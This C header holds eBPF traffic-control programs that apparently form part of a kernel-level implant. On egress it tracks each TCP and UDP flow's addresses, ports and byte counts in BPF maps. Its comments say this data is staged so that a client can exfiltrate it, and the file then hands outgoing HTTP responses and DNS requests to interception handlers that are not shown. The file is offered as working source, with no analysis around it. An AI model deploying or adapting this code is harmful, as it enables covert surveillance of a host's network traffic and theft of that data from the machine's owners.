/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2021
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _TC_H_
#define _TC_H_

SEC("classifier/egress")
int egress(struct __sk_buff *skb)
{
    struct cursor c;
    struct pkt_ctx_t pkt;

    tc_cursor_init(&c, skb);
    if (!(pkt.eth = parse_ethhdr(&c))) {
        return TC_ACT_OK;
    }

    // we only support IPv4 for now
    if (pkt.eth->h_proto != htons(ETH_P_IP)) {
        return TC_ACT_OK;
    }

    if (!(pkt.ipv4 = parse_iphdr(&c))) {
        return TC_ACT_OK;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (!(pkt.tcp = parse_tcphdr(&c))) {
                return TC_ACT_OK;
            }
            break;

        case IPPROTO_UDP:
            if (!(pkt.udp = parse_udphdr(&c))) {
                return TC_ACT_OK;
            }
            break;

        default:
            return TC_ACT_OK;
    }

    // generate flow
    struct flow_t flow = {
        .data = {
            .saddr = pkt.ipv4->saddr,
            .daddr = pkt.ipv4->daddr,
            .flow_type = EGRESS_FLOW,
        },
    };
    if (pkt.ipv4->protocol == IPPROTO_TCP) {
        flow.data.source_port = htons(pkt.tcp->source);
        flow.data.dest_port = htons(pkt.tcp->dest);
    } else if (pkt.ipv4->protocol == IPPROTO_UDP) {
        flow.data.source_port = htons(pkt.udp->source);
        flow.data.dest_port = htons(pkt.udp->dest);
    } else {
        return TC_ACT_OK;
    }

    // select flow counter
    struct network_flow_counter_t *counter = bpf_map_lookup_elem(&network_flows, &flow);
    if (counter == NULL) {
        // this is a new flow, generate a new entry
        u32 key = 0;
        u32 *next_key = bpf_map_lookup_elem(&network_flow_next_key, &key);
        if (next_key == NULL) {
            // should never happen
            return TC_ACT_OK;
        }

        // check if we should loop back to the first entry
        if (*next_key == MAX_FLOW_COUNT) {
            *next_key = 0;
        } else if (*next_key == MAX_FLOW_COUNT + 1) {
            // ignore new flows until the client exfiltrates the collected data
            return TC_ACT_OK;
        } else if (*next_key > MAX_FLOW_COUNT + 1) {
            // should never happen
            return TC_ACT_OK;
        }

        // delete previous flow counter at next_key
        struct flow_t *prev_flow = bpf_map_lookup_elem(&network_flow_keys, next_key);
        if (prev_flow != NULL) {
            bpf_map_delete_elem(&network_flows, prev_flow);
            bpf_map_delete_elem(&network_flow_keys, next_key);
        }

        // set flow counter for provided key
        struct network_flow_counter_t new_counter = {};
        bpf_map_update_elem(&network_flows, &flow, &new_counter, BPF_ANY);

        // set the flow in the network_flow_keys for exfiltration
        bpf_map_update_elem(&network_flow_keys, next_key, &flow, BPF_ANY);
        *next_key += 1;
    }

    counter = bpf_map_lookup_elem(&network_flows, &flow);
    if (counter == NULL) {
        // should never happen
        return TC_ACT_OK;
    }

    // add packet length to counter
    if (pkt.ipv4->protocol == IPPROTO_TCP) {
        counter->data.tcp_count = counter->data.tcp_count + htons(pkt.ipv4->tot_len);
    } else if (pkt.ipv4->protocol == IPPROTO_UDP) {
        counter->data.udp_count = counter->data.udp_count + htons(pkt.ipv4->tot_len);
    }

    bpf_tail_call(skb, &tc_progs, TC_DISPATCH);
    return TC_ACT_OK;
}

SEC("classifier/egress_dispatch")
int egress_dispatch(struct __sk_buff *skb)
{
    struct cursor c;
    struct pkt_ctx_t pkt;

    tc_cursor_init(&c, skb);
    if (!(pkt.eth = parse_ethhdr(&c)))
        return TC_ACT_OK;

    // we only support IPv4 for now
    if (pkt.eth->h_proto != htons(ETH_P_IP))
        return TC_ACT_OK;

    if (!(pkt.ipv4 = parse_iphdr(&c)))
        return TC_ACT_OK;

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (!(pkt.tcp = parse_tcphdr(&c)) || pkt.tcp->source != htons(load_http_server_port()))
                return TC_ACT_OK;

             // bpf_printk("OUT - SEQ:%x ACK_NO:%x ACK:%d\n", htons(pkt.tcp->seq >> 16) + (htons(pkt.tcp->seq) << 16), htons(pkt.tcp->ack_seq >> 16) + (htons(pkt.tcp->ack_seq) << 16), pkt.tcp->ack);
             // bpf_printk("      len: %d\n", htons(pkt.ipv4->tot_len) - (pkt.tcp->doff << 2) - (pkt.ipv4->ihl << 2));

            // adjust cursor with variable tcp options
            c.pos += (pkt.tcp->doff << 2) - sizeof(struct tcphdr);
            return handle_http_resp(skb, &c, &pkt);

        case IPPROTO_UDP:
            if (!(pkt.udp = parse_udphdr(&c)) || pkt.udp->dest != htons(DNS_PORT))
                return TC_ACT_OK;

            return handle_dns_req(skb, &c, &pkt);
    }

    return TC_ACT_OK;
};

#endif
